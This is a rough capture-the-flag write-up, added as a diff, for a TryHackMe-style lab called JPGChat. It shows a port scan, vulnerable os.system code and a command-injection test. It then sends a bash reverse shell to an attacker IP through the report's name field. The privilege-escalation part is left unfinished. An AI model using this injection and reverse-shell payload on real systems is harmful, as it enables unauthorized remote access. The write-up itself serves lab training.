@@ -1,0 +1,76 @@
+
+nmap --script firewall-bypass <target>
+
+PORT     STATE SERVICE    REASON  VERSION
+22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  tcpwrapped syn-ack
+
+
+Use: nc $IP 3000
+
+We would get a hint of admin's name
+
+we would go to the github to hunt down the github account
+
+Then in the code we would see that we have line:
+
+os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
+os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
+
+We would target these line to get a reverse shell
+
+So, just practicing what is happening:
+
+$ python3
+Python 3.9.1+ (default, Feb  5 2021, 13:46:56) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> name = "Hi; fish;" -------> If we don't use ';' => it wil produce undezirable result
+>>> os.system("bash -c 'echo %s > report.txt'" % name)
+Hi
+                 Hey, welcome back kali ! 
+     Welcome to fish, the Friendly Interactive SHell
+  Today is Tuesday, Utilize this day and extract the best out of it...!!  
+
+         Your Fish Shell Version: 3.1.2. Explore... !
+                                                                 
+kali@reveng ~/T/T/N/JPGChat> ls
+36267.c  ans.txt  report.txt
+kali@reveng ~/T/T/N/JPGChat> exit
+0
+>>> 
+
+So, now we would add bash reverse shell in place of fish.
+
+--->
+
+$ nc 10.10.34.149 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+hi;bash -i >& /dev/tcp/10.8.112.253/4444 0>&1; <- Here, we placed our bash reverse shell
+your report:
+ok
+hi                      
+
+Now we got that shell on my listener nc on the other terminal
+
+For priv esc:
+
+$ sudo -l
+
+We saw:
+
+see: https://more4money.gitbook.io/writeups/tryhackme/jpgchat
+
+CONFUSSION:
+
+We did we use the name of the python reverse shell as: compare.py
+
+As when I used the same code but with different name, it didn't work...
+`
